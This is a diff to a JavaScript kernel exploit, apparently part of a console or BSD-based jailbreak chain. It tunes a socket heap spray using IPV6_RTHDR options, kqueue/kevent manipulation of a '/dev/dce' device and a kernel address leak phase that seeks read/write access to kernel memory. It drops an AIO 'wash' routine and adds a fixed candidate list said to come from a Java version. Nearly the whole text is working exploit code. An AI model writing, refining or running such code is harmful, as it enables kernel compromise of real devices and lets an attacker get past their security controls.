@@ -11,11 +11,6 @@ const NUM = {
   kqueue: 362, kevent: 363,
   mmap: 477, munmap: 73,
   jitshm_create: 533,
-  aio_multi_delete: 662,
-  aio_multi_wait: 663,
-  aio_multi_poll: 664,
-  aio_multi_cancel: 666,
-  aio_submit_cmd: 669,
 };
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
 const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
@@ -24,6 +19,10 @@ const TPL_LO = 0x43434343;
 const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
+
+// The exact CANDS array from Hx1400.java line 151
+const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
+const ROUNDS = 6;
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
@@ -188,66 +187,6 @@ function marked(fd, rdb, lenp) {
   return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
 
-function phaseSpray(N) {
-  const fds = [];
-  for (let i = 0; i < N; i++) {
-    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-    if (fd <= 0) break;
-    fds.push(fd);
-  }
-  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
-  log("SPRAY", "sockets=" + fds.length);
-  const rth = allocBuf(512);
-  for (const fd of fds) {
-    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
-  }
-  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
-  return { fds, rth };
-}
-
-// --- AIO WASH (from Java exploit) ---
-let aio_bufs = null;
-function washAio() {
-  if (!aio_bufs) {
-    aio_bufs = {
-      req: allocBuf(5 * 40),
-      subSt: allocBuf(5 * 4),
-      canSt: allocBuf(5 * 4),
-      waiSt: allocBuf(5 * 4),
-      polSt: allocBuf(5 * 4),
-      to: allocBuf(8)
-    };
-    for (let i = 0; i < 5; i++) {
-      aio_bufs.req.dv.setUint32(i * 40 + 8, 0, true);
-      aio_bufs.req.dv.setInt32(i * 40 + 32, -1, true);
-    }
-    aio_bufs.to.dv.setUint32(0, 1000, true);
-  }
-  
-  for (let iter = 0; iter < 32; iter++) {
-    aio_bufs.subSt.u8.fill(0);
-    scn("aio_submit_cmd", 4097, aio_bufs.req.addr, 5, 3, aio_bufs.subSt.addr);
-    
-    aio_bufs.waiSt.u8.fill(0);
-    scn("aio_multi_wait", aio_bufs.subSt.addr, 5, aio_bufs.waiSt.addr, 0, aio_bufs.to.addr);
-    
-    for (let r = 0; r < 4; r++) {
-      aio_bufs.polSt.u8.fill(0);
-      scn("aio_multi_poll", aio_bufs.subSt.addr, 5, aio_bufs.polSt.addr);
-      
-      aio_bufs.canSt.u8.fill(0);
-      scn("aio_multi_cancel", aio_bufs.subSt.addr, 5, aio_bufs.canSt.addr);
-      
-      let remaining = 0;
-      for (let i = 0; i < 5; i++) {
-        if (aio_bufs.canSt.dv.getInt32(i * 4, true) !== 0) remaining++;
-      }
-      if (remaining === 0) break;
-    }
-  }
-}
-// ------------------------------------
-
 function phase2Leak(rootKq, fds) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -260,19 +199,18 @@ function phase2Leak(rootKq, fds) {
   let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
   let kva = -1n, pageVal = 0n;
   let tries = 0;
+  let blind = 0;
 
-  for (let attempt = 1; attempt <= 6; attempt++) {
+  for (let attempt = 1; attempt <= ROUNDS; attempt++) {
     if (target >= 0) break;
-    log("KV-ATTEMPT", attempt + "/6");
+    log("KV-ATTEMPT", attempt + "/" + ROUNDS);
     
     for (const fd of fds) { if (fd !== -1) disarm(fd); }
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
-    
-    // Run AIO Wash before the candidates
-    log("KV-WASH", "washing...");
-    washAio();
 
-    for (let vi = 0; vi < fds.length && target < 0; vi++) {
+    for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
+      const vi = CANDS[ci];
+      if (vi >= fds.length) continue;
       const fd = fds[vi];
       if (fd === -1) continue;
       
@@ -282,12 +220,8 @@ function phase2Leak(rootKq, fds) {
       scn("close", fd);
       fds[vi] = -1; 
       
-      // Open DCE
       const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
       if (dce < 0) continue;
-      
-      // Run AIO wash again to force slab overlap
-      washAio();
       
       const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
       const pageInt = Number(page & 0xffffffffn) | 0;
@@ -299,29 +233,28 @@ function phase2Leak(rootKq, fds) {
       cl.dv.setInt16(10, 1, true);
       cl.dv.setUint32(16, 90, true);
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-      log("KV-PLANT", "idx=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
+      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
       
-      if (rc !== 0) continue; 
-
       let joined = 0;
-      for (let j = 0; j < fds.length; j++) {
-        if (j === vi) continue;
-        if (fds[j] === -1) continue;
-        
-        zeroBuf(rdb);
-        lenp.dv.setUint32(0, RTH_LEN, true);
-        lenp.dv.setUint32(4, 0, true);
-        if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
-        const v8 = rdb.dv.getInt32(8, true);
-        const v12 = rdb.dv.getUint32(12, true) >>> 0;
-        if (v8 === pageInt && v12 === 0) {
-          joined++;
-          if (target < 0) { target = j; targetFd = fds[j]; }
-          log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
-          // still armed
-        } else {
-          rearm(fds[j], tpl);
+      if (rc === 0) {
+        for (let j = 0; j < fds.length; j++) {
+          if (j === vi || fds[j] === -1) continue;
+          
+          zeroBuf(rdb);
+          lenp.dv.setUint32(0, RTH_LEN, true);
+          lenp.dv.setUint32(4, 0, true);
+          if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
+          const v8 = rdb.dv.getInt32(8, true);
+          const v12 = rdb.dv.getUint32(12, true) >>> 0;
+          if (v8 === pageInt && v12 === 0) {
+            joined++;
+            if (target < 0) { target = j; targetFd = fds[j]; }
+            log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
+          } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
+            // still armed
+          } else {
+            rearm(fds[j], tpl);
+          }
         }
       }
 
@@ -334,14 +267,26 @@ function phase2Leak(rootKq, fds) {
         if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
         else {
           candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
-          log("KV-HELD", "round=" + attempt + " try=" + tries + " idx=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
+          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
         }
+      } else {
+        if (rc === 0) {
+          blind++;
+          zeroBuf(cl);
+          cl.dv.setUint32(0, dce >>> 0, true);
+          cl.dv.setInt16(8, -18, true);
+          cl.dv.setInt16(10, 2, true);
+          scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
+        }
+        scn("close", dce);
+        rearm(fd, tpl);
+        fds[vi] = fd;
       }
     }
   }
 
   if (kva === -1n) fin("leak scan: no victim held");
-  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " idx=" + candIdx);
+  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
   return { kva, page: pageVal, targetFd };
 }
 
@@ -358,15 +303,8 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  const burn = [];
-  for (let i = 0; i < 250; i++) {
-    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
-    if (fd >= 0) burn.push(fd);
-  }
-  log("FD-BURN", "burned " + burn.length + " fds");
-  
   const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(256);
+  const { fds } = phaseSpray(144); // Exact Java spray size
 
   const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
   const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
